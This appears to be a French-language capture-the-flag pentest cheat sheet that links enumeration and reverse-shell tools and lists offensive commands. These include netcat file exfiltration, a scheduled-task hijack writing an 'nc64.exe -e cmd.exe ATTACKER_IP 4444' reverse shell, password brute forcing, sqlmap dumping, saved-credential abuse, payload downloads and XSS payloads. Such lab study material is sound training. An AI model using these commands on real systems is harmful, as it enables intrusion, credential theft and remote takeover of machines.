```
===========================================

_______________________________ /\ 
\_   ___ \__    ___/\_   _____/ )/______
/    \  \/ |    |    |    __)    /  ___/
\     \____|    |    |     \     \___ \ 
 \______  /|____|    \___  /    /____  >
        \/               \/          \/ 

============================================
```
# Énumeration

linPEAS : https://github.com/carlospolop/PEASS-ng/blob/master/linPEAS <br>
linEnum : https://github.com/rebootuser/LinEnum <br>
winPEAS : https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASbat (.bat) <br>

# Objectif Reverse shell !

Netcat for windows : https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip <br>
Hacker tools : https://addons.mozilla.org/en-US/firefox/addon/hacktools/ <br>
Reverse Shells : https://www.revshells.com/ <br>
Reverse shell php : https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php <br>

# Utiles

subdomains.txt : https://raw.githubusercontent.com/danTaler/WordLists/master/Subdomain.txt <br>
Bypass authentication : https://book.hacktricks.xyz/pentesting-web/nosql-injection#basic-authentication-bypass <br>
PAYLOADSALLTHETHINGS : https://github.com/swisskyrepo/PayloadsAllTheThings (reverse shell, etc...) <br>
Binaries exploit : https://gtfobins.github.io/ <br>
PrivEscCheck (windows) : https://github.com/itm4n/PrivescCheck <br>
```
PS C:\> Set-ExecutionPolicy Bypass -Scope process -Force
PS C:\> . .\PrivescCheck.ps1
PS C:\> Invoke-PrivescCheck
```
wes.py (aussi pour windows): https://github.com/bitsadmin/wesng/blob/master/wes.py <br>
```
user@kali$ wes.py systeminfo.txt        
```
Windows Local PrivEsc : https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation

-------------------------------------------------------------------------------------------------------------------------------------------+
# Basiques
```
[+] => INFO GATHERING           - sudo -l
[+] => SPAWN SHELL USING BASH   - bash -i
[+] => TRANSFER FILE VIA NETCAT - [victime] nc -nv <ip> 1337 < <file_to_transfer> | [attacker] nc -lnvp 1337 > <file_to_transfer>
```
-------------------------------------------------------------------------------------------------------------------------------------------+
# Linux
```
[CMD](JS)        => <iframe src=file:///etc/passwd></iframe>
[CMD](WordPress) => wpscan => ex (brute force mdp) wpscan --url 10.10.180.74/blog -U admin -P /usr/share/wordlists/rockyou.txt
[CMD](misconfig) => bash -p
[CMD](BINARIES)  => find / -user root -perm -4000 -exec ls -ldb {} \;
[CMD](GOBUSTER)  => gobuster dir -u <url> -w=/usr/share/wordlists/dirb.../<list> -b <status_code_to_exclude>
[CMD](NMAP/SMB)  => nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse MACHINE_IP  (SAMBA)
                    smbclient //<ip>/anonymous (-U pour un utilisateurs)
                    smbclient //10.10.188.11/BillySMB -I 10.10.188.11 -U bjoel
                    smbget -R smb://<ip>/anonymous
[CMD](FFUF)      => ffuf -c -w /usr/share/wordlists/subdomains.txt -u http://domain.com/ -H "Host: FUZZ.domain.com" -fc 301
[CMD](list)      => msfvenom -l payloads | grep windows | grep reverse | grep shell  (exemple)
[CMD](decrypt)   => john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt  --format=<format>
[CMD](sql)       => sqlmap -r file.txt --dbms=mysql --dump | (après avoir copier une requête Burp dans un fichier txt)
[CMD](ftp)       => wget -m --no-passive ftp://anonymous:anonymous@<IP>  (download tout)
```
<br>
[?] Using "-p" on an SUID file will run it with the permission of the owner. Ex if root own a file and you run it (non-root) using "-p" you will run it with root perm
<br> 
<br>

# Windows

```
[RDP]            => xfreerdp /d:<domain> /u:'<user>' /p:'<password>' /v:<prefix>.<domain> /drive:.,kali-share +clipboard

[CMD](WIN)*PS*   => Invoke-WebRequest -Uri "http://<ip>:<port>/<file>" -Outfile <outfile>
[CMD](WIN)*PS*   => Expand-Archive <file.zip>
[CMD](WIN)*PS*   => type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt (ou %userprofile% avec CMD)
[CMD](WIN)*PS*   => cmdkey /list  #liste les creds sauvegardés
[CMD](WIN)*PS*   => runas /savecred /user:admin cmd.exe  #exécute l'action avec les credentials sauvegardés
[CMD](WIN)*PS*   => schtasks | schtasks /query /tn TASKVULNERABLE /fo list /v   #Planificateur de tâche
                    icacls c:\tasks\schtask.bat #Donne des infos sur les permissions planificateur de tâches
                    echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
                    schtasks /run /tn vulntask #Exécute la tâche direct

[CMD](WIN)*CMD*  => certutil.exe -urlcache -f http://<ip>:<port>/file.exe new_file.exe
```

# AntiVirus

```
========================= OBTENIR LES INFOS SUR LES AV INSTALLE =============================

*CMD* & *PS*  => wmic /namespace:\\root\securitycenter2 path antivirusproduct
*PS*          => Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct

=============================================================================================

*PS* Check si actif =>  Get-MpComputerStatus | select RealTimeProtectionEnabled
```

# Some XSS Cheats
```
<script>document.querySelector('#page-title').textContent = 'New text'</script>
<img src=x onerror=alert('hello')>
```


-------------------------------------------------------------------------------------------------------------------------------------------+

